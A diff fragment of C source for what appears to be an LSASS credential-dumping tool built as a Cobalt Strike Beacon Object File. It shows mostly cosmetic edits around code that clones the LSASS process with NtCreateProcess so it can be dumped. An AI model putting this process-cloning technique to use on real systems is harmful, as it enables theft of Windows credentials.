@@ -371,7 +371,7 @@ HANDLE get_process_handle(
         &ObjectAttributes,
         &uPid
     );
-    
+
     if (status == STATUS_INVALID_CID)
     {
 #ifdef BOF
@@ -408,9 +408,9 @@ HANDLE get_process_handle(
         );
         return NULL;
     }
-
     if (clone == 1)
     {
+        // fork the LSASS process
         HANDLE hCloneProcess = NULL;
         OBJECT_ATTRIBUTES CloneObjectAttributes;
 
@@ -422,8 +422,17 @@ HANDLE get_process_handle(
             NULL
         );
 
-        status = NtCreateProcess(&hCloneProcess, GENERIC_ALL, &CloneObjectAttributes, hProcess, TRUE, NULL, NULL, NULL);
-        
+        status = NtCreateProcess(
+            &hCloneProcess,
+            GENERIC_ALL,
+            &CloneObjectAttributes,
+            hProcess,
+            TRUE,
+            NULL,
+            NULL,
+            NULL
+        );
+
         if (!NT_SUCCESS(status))
         {
 #ifdef BOF
@@ -442,7 +451,10 @@ HANDLE get_process_handle(
             return hCloneProcess;
         }
     }
-    return hProcess;
+    else
+    {
+        return hProcess;
+    }
 }
 
 ULONG32 convert_to_little_endian(
@@ -1334,7 +1346,7 @@ void go(char* args, int length)
     {
         BeaconPrintf(
             CALLBACK_ERROR,
-            "Process cloning requires a PID. Exiting..."
+            "Process cloning requires a PID"
         );
         return;
     }
@@ -1567,7 +1579,7 @@ int main(int argc, char* argv[])
 
     if (clone == 1 && pid == 0)
     {
-        printf("Process cloning requires a PID. Exiting...");
+        printf("Process cloning requires a PID");
         return -1;
     }
 
